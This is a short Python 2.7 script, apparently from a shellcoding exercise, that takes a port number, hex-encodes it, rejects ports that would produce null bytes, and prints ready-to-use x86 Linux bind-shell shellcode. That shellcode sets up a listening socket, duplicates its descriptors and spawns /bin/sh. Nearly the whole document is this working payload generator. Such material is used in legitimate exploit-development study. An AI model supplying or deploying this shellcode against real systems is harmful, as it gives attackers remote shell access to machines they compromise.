#!/usr/bin/python2.7

import os
import sys

port_number = str(sys.argv[1])
hex_port_number_reverse = ''

# Check if port number is above 1024 and below 65535

if int(port_number) < 1024 or int(port_number) > 65535:
	print ''
	print 'The port number is below 1024, please choose between 1024 and 65535'
	print 'Usage: $shell_bind_tcp.py PORT_NUMBER'
	print 'example: $shell_bind_tcp.py 1234'
	print ''
else:
	if len(hex(int(port_number))) < 6:
		hex_port_number = str(hex(int(port_number)))
		hex_port_number = '0' + hex_port_number[2:]
		new_port_number = '\\x' + hex_port_number[:2] + '\\x' + hex_port_number[2:]

	else:
		hex_port_number = str(hex(int(port_number)))[2:]
		new_port_number = '\\x' + hex_port_number[:2] + '\\x' + hex_port_number[2:]


	# Check if there are zeros
	if new_port_number[3:5] == '00' or new_port_number[8:] == '00':
		print 'There are bad characters, please choose different port number'
	else:
		shellcode = '"\\x31\\xc0\\x31\\xdb\\x31\\xd2\\x31\\xff\\xb0\\x66\\xb3\\x01\\x52\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x31\\xc0\\xb0\\x66\\x43\\x52\\x66\\x68' + new_port_number + '\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x04\\x52\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc0\\xb0\\x66\\xfe\\xc3\\x52\\x52\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc9\\xb1\\x02\\x89\\xc3\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"'
		print ''
		print 'Your new bind shellcode with ' + port_number + ' port number:'
		print shellcode
